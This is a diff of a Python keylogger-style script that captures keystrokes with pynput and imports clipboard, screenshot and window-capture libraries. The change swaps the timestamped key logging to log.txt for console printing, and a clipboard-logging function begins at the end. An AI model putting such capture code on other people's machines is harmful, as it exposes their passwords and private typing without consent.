@@ -1,5 +1,4 @@
 from pynput import keyboard
-from datetime import datetime
 import pyperclip
 import time
 from PIL import ImageGrab
@@ -9,23 +8,21 @@ import pygetwindow as gw
 import threading
 
 
-timestamp = datetime.now().isoformat()
-# This function runs every time a key is pressed
 def on_press(key):
+
     try:
-        # Get the normal character pressed
-        key_data = key.char
+
+        print(f'Key pressed: {key.char}')
+
     except AttributeError:
-        # Handle special keys (like Space, Enter, Shift)
-        key_data = f" [{key}] "
 
-    # Write the key to a local log file
-    with open("log.txt", "a", encoding="utf-8") as f:
-        f.write(f"{timestamp} | {key_data}\n")
+        print(f'Special key pressed: {key}')
 
-# Start listening to the keyboard
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+listener = keyboard.Listener(on_press=on_press)
+
+listener.start()
+
+listener.join()
 
 
 def log_clipboard():
